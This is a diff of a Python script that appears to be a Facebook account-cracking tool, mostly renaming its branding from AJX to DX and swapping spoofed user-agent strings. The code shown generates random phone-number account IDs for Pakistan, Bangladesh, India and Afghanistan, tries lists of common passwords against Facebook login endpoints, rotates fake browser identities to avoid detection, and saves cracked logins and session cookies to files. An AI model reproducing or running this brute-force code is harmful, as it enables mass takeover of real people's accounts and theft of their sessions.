@@ -18,7 +18,7 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python AJX.py')
+        os.system('python DX.py')
 except:pass
 
 header_grup = {'user-agent':'FBAN/FB4A;FBAV/328.1.0.28.119;FBPN/com.facebook.katana;FBLC/en_US;FBBV/306506931;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/7.1.1;FBCA/x86:armeabi;FBDM/{density=3.0,width=1080,height=1794'}
@@ -75,11 +75,11 @@ for xd in range(10000):
     l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
-#Mozilla/5.0 (Linux; Android 11; RMX2101 Build/RKQ1.201217.002) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.28 Chrome/110.0.5481.154 Mobile Safari/537.36
-#Mozilla/5.0 (Linux; Android 11; RMX2101) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36
-    aa='Mozilla/5.0 (Linux; Android 11;'
+#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
+#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
+    aa='Mozilla/5.0 (Linux; Android 13;'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
-    c=random.choice(['Realme C17'])
+    c=random.choice(['Redmi Note 10 Pro'])
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -88,14 +88,14 @@ for xd in range(10000):
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
-    l='Chrome/105.0.0.0 Mobile Safari/537.36'
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
     
     
-    aa='Mozilla/5.0 (Linux; Android 11;'
+    aa='Mozilla/5.0 (Linux; Android 10;'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
-    c=random.choice(['Realme C17'])
+    c=random.choice(['Redmi Note 10 Pro'])
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -110,7 +110,7 @@ for xd in range(10000):
 	
     aa='Mozilla/5.0 (Linux; Android 12;'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
-    c=random.choice(['Realme C17'])
+    c=random.choice(['Redmi Note 10 Pro'])
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -126,7 +126,7 @@ for xd in range(10000):
 	
     aa='Mozilla/5.0 (Linux; Android 11;'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
-    c=random.choice(['Realme C17'])
+    c=random.choice(['Redmi Note 10 Pro'])
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -135,13 +135,13 @@ for xd in range(10000):
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
-    l='Chrome/105.0.0.0 Mobile Safari/537.36'
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
     
     aa='Mozilla/5.0 (Linux; Android 9;'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
-    c=random.choice(['Realme C17'])
+    c=random.choice(['Redmi Note 10 Pro'])
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -154,8 +154,8 @@ for xd in range(10000):
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
     
-    #Mozilla/5.0 (Linux; Android 11; RMX2101) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36
-    aa='Mozilla/5.0 (Linux; Android 11;'
+    #Mozilla/5.0 (Linux; Android 10; Redmi Note 7S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36
+    aa='Mozilla/5.0 (Linux; Android 10;'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
     c=random.choice(['Redmi Note 7S'])
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -166,7 +166,7 @@ for xd in range(10000):
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
-    l='Chrome/105.0.0.0 Mobile Safari/537.36'
+    l='Chrome/83.0.4103.101 Mobile Safari/537.36'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
     
@@ -189,9 +189,9 @@ for xd in range(10000):
     
     
     
-    aa='Mozilla/5.0 (Linux; Android 11;'
+    aa='Mozilla/5.0 (Linux; Android 13;'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
-    c=random.choice(['Realme C17)'])
+    c=random.choice(['Vivo Y91C)'])
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -200,14 +200,14 @@ for xd in range(10000):
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
-    l='Chrome/105.0.0.0 Mobile Safari/537.36'
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
     
     #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76
     aa='Mozilla/5.0 (Linux; Android 13;'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
-    c=random.choice(['Realme C17'])
+    c=random.choice(['Redmi Note 10 Pro'])
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -1048,9 +1048,9 @@ for xd in range(10000):
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
 	
-    aa='Mozilla/5.0 (Linux; Android 11;'
+    aa='Mozilla/5.0 (Linux; Android 10;'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
-    c=random.choice(['Realme C17)'])
+    c=random.choice(['Vivo Y91C)'])
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -1059,28 +1059,28 @@ for xd in range(10000):
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
-    l='Chrome/104.0.5112.97 Mobile Safari/537.36'
+    l='Chrome/98.0.4711.185 Mobile Safari/537.36'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
 	
     aa='Mozilla/5.0 (Linux; Android 11;'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
-    c=random.choice(['RMX2101 Build/'])
+    c=random.choice(['M2012K11AG Build/'])
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
+    g='RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
     h=random.randrange(80,103)
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
-    l='Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 WpsMoffice/16.3.2/arm64-v8a/1328'
+    l='Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 WpsMoffice/16.3.2/arm64-v8a/1328'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
 	
     aa='Mozilla/5.0 (Linux; Android 11;'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
-    c=random.choice(['Realme C17)'])
+    c=random.choice(['Vivo Y91C)'])
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -1089,7 +1089,7 @@ for xd in range(10000):
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
-    l='Chrome/91.0.4472.88 Mobile Safari/537.36'
+    l='Chrome/97.0.4740.200 Mobile Safari/537.36'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
 	
@@ -1104,15 +1104,14 @@ for xd in range(10000):
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
-    l='VenusBrowser/3.2.28 Chrome/110.0.5481.154 Mobile Safari/537.36'
+    l='JioBrowser/1.4.7 Chrome/69.0.3497.100 Mobile Safari/537.36'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
    
    
 
 
-logo=("""\033[1;37m
-
+logo=("""\033[1;37m#FF0018
       
  .----------------.  .----------------. 
 | .--------------. || .--------------. |
@@ -1125,7 +1124,7 @@ logo=("""\033[1;37m
 | |              | || |              | |
 | '--------------' || '--------------' |
  '----------------'  '----------------' 
-                                        ALAHI°XD(⁠^⁠^⁠)
+                      ALAHI°XD(⁠^⁠^⁠)
                                    
 """)
 def linex():
@@ -1239,7 +1238,7 @@ def auto_file(cookies,access_token):
         sid = "1"
         os.system('cat .txt | grep "'+sid+'" > .temp.txt')
         file = open('.temp.txt','r').read().splitlines()
-        print('\n \033[1;97m /sdcard/AJX.txt \033[0;97m\n')
+        print('\n \033[1;97m /sdcard/DX.txt \033[0;97m\n')
         #100010138361148
         sf = input(' Saved File As : ')
         print('')
@@ -1290,7 +1289,7 @@ def new_file(cookies,access_token):
                 sid = input(f' Put {el+1} link: ')
                 os.system('cat .txt | grep "'+sid+'" > .temp.txt')
         file = open('.temp.txt','r').read().splitlines()
-        print('\n \033[1;97m /sdcard/AJX.txt \033[0;97m\n')
+        print('\n \033[1;97m /sdcard/DX.txt \033[0;97m\n')
         #100010138361148
         sf = input(' Saved File As : ')
         print('')
@@ -1483,7 +1482,7 @@ def public():
                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python AJX.py')
+                os.system('python DX.py')
         except requests.exceptions.ConnectionError:
                 exit(f' No internet connection')
         except (KeyError,IOError):
@@ -1503,7 +1502,7 @@ def crack():
                                         print(' \033[1;32mNEW IDZ CRACK USE 1 PASS  \033[1;37m \n [1] first last [2] firstlast  -----> For more  \n \033[1;32BEST RESULT\033[1;37m \n [1] first last\n [2] firstlast\n [3] First Last\n [4] First Last')
                                         linex()
                                         input(' Press enter to back menu ')
-                                        os,system('python AJX.py')
+                                        os,system('python DX.py')
                                         crack()                                        
 def menu():
         global lim,tp
@@ -1587,9 +1586,9 @@ def menu():
                                         print("\033[1;32m brute has been started")
                                         print("\033[1;32m Use airplane mode for speed up")
                                         linex()
-                                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/AJX-OK.TXT")
-                                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/AJX-CP.TXT")
-                                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/AJX-COOKIE.TXT")
+                                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/DX-OK.TXT")
+                                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/DX-CP.TXT")
+                                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/DX-COOKIE.TXT")
                                         linex()
                             
                                         
@@ -1610,7 +1609,7 @@ def menu():
                                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                                 linex()
                                 input(' Press enter to back ')
-                                os.system('python AJX.py')
+                                os.system('python DX.py')
                         elif xd in ['2','02']:
                                 create_file_login()
                         elif xd in ['3','03']:
@@ -1680,7 +1679,7 @@ def za():
         input(" press enter to send key")
         linex();print(" You are not paid user ");linex()
         os.system("xdg-open https://wa.me/+923431044275")
-        print(" run again python AJX.py")
+        print(" run again python DX.py")
              
                                                 
 def pak():
@@ -1698,28 +1697,28 @@ def pak():
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
                 
-                with tred(max_workers=30) as AJX:     
+                with tred(max_workers=30) as DX:     
                         clear()
                         tl = str(len(user))
                         print(' Total ids : \033[1;32m'+tl)
                         print(f'\033[1;32m brute has been started')
                         print(f'\033[1;32m Use airplane mode for speed up ')
                         linex()
-                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/AJX-OK.TXT")
-                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/AJX-CP.TXT")
-                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/AJX-COOKIE.TXT")
+                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/DX-OK.TXT")
+                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/DX-CP.TXT")
+                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/DX-COOKIE.TXT")
                         linex()
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','peshawar','pakistan']
-                                AJX.submit(rndm,ids,passlist)
+                                DX.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python AJX.py')
+                os.system('python DX.py')
 def bd():
                 user=[]
                 global lim
@@ -1749,14 +1748,14 @@ def bd():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
-                                AJX.submit(rndm,ids,passlist)
+                                DX.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python AJX.py')
+                os.system('python DX.py')
                 
 def afgan():
 
@@ -1774,16 +1773,16 @@ def afgan():
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
                 
-                with tred(max_workers=30) as AJX:     
+                with tred(max_workers=30) as DX:     
                         clear()
                         tl = str(len(user))
                         print(' Total ids : \033[1;32m'+tl)
                         print(f'\033[1;32m Brute has been started  ')
                         print(f'\033[1;32m Use airplane mode for speed up ')
                         linex()
-                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/AJX-OK.TXT")
-                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/AJX-CP.TXT")
-                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/AJX-COOKIE.TXT")
+                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/DX-OK.TXT")
+                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/DX-CP.TXT")
+                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/DX-COOKIE.TXT")
                         linex()
                         for psx in user:
                                 ids = code+psx
@@ -1791,14 +1790,14 @@ def afgan():
                             
                                 passlist = [psx,psx[1:],"afgan123",ids,'afgan1122']
                             
-                                AJX.submit(rndm,ids,passlist)
+                                DX.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python AJX.py')
+                os.system('python DX.py')
               
 def india():
 
@@ -1818,16 +1817,16 @@ def india():
                         nmp = ''.join(random.choice(string.digits) for _ in range(10-len(code)))
                         user.append(nmp)
                 
-                with tred(max_workers=30) as AJX:     
+                with tred(max_workers=30) as DX:     
                         clear()
                         tl = str(len(user))
                         print(' Total  ids : \033[1;32m'+tl)
                         print(f'\033[1;32m Brute has been started  ')
                         print(f'\033[1;32m Use airplane mode for speed up ')
                         linex()
-                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/AJX-OK.TXT")
-                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/AJX-CP.TXT")
-                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/AJX-COOKIE.TXT")
+                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/DX-OK.TXT")
+                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/DX-CP.TXT")
+                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/DX-COOKIE.TXT")
                         linex()
                         for psx in user:
                                 ids = code+psx
@@ -1835,14 +1834,14 @@ def india():
                             
                                 passlist = [ids[4:],psx,ids,"india123","india12345"]
                             
-                                AJX.submit(rndm,ids,passlist)
+                                DX.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python AJX.py')
+                os.system('python DX.py')
 def gmail():
                 os.system('rm -rf .re.txt')
                 global lim
@@ -1877,7 +1876,7 @@ def gmail():
                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         fo = open('.re.txt', 'r').read().splitlines()
                 
-                with tred(max_workers=30) as AJX:
+                with tred(max_workers=30) as DX:
                         total = str(len(fo))
                         clear()
                         print(' Total ids : \033[1;32m'+total)
@@ -1893,18 +1892,18 @@ def gmail():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                AJX.submit(rndm,ids,passlist)
+                                DX.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python AJX.py')
+                os.system('python DX.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps,lim
         p=round(loop*100/lim,2)
-        sys.stdout.write('\r\r\033[1;37m [AJX] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [DX] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -1918,7 +1917,7 @@ def ffb(ids,names,passlist):
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
                         head = {                         
-                          'authority': 'x.facebook.com',
+                           'authority': 'x.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
@@ -1937,24 +1936,24 @@ def ffb(ids,names,passlist):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    }
+}
                         getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        AJX=str(session.cookies)
-                        if "c_user" in AJX:
-                                print('\r\r\033[1;32m [AJX-OK] %s | %s'%(ids,pas))
+                        DX=str(session.cookies)
+                        if "c_user" in DX:
+                                print('\r\r\033[1;32m [DX-OK] %s | %s'%(ids,pas))
                                 dc=dict(session.cookies)
                                 coki=";".join([k+"="+v for k,v in dc.items()])
                                 print("Cookie: "+coki)
-                                open('/sdcard/AJX-COOKIE.txt','a').write(coki+'\n')
-                                open('/sdcard/AJX-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open('/sdcard/DX-COOKIE.txt','a').write(coki+'\n')
+                                open('/sdcard/DX-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in AJX:
+                        elif 'checkpoint' in DX:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[38;5;208m [AJX-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/AJX-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;208m [DX-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/DX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -1969,7 +1968,7 @@ def api(ids,names,passlist):
                 try:
                         global ok,loop,lim
                         p=round(loop*100/lim,2)
-                        sys.stdout.write('\r\r\033[1;37m [AJX] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [DX] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -2019,14 +2018,14 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [AJX-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/AJX-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [DX-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/DX-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [AJX-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/AJX-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [DX-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/DX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -2040,7 +2039,7 @@ def api1(ids,names,passlist):
                 try:
                         global ok,loop,lim
                         p=round(loop*100/lim,2)
-                        sys.stdout.write('\r\r\033[1;37m [AJX] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [DX] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -2090,18 +2089,18 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [AJX-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/AJX-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [DX-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/DX-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [AJX-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/AJX-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [DX-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/DX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/AJX-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/DX-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -2114,7 +2113,7 @@ def rndm(ids,passlist):
         global loop,oks,lim
         p=round(loop*100/lim,2)
                 
-        sys.stdout.write('\r\r\033[1;37m [AJX] [%s] \033[1;37m[OK=%s] [%s%%] \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [DX] [%s] \033[1;37m[OK=%s] [%s%%] \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
         try:
                 for pas in passlist:
                         application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
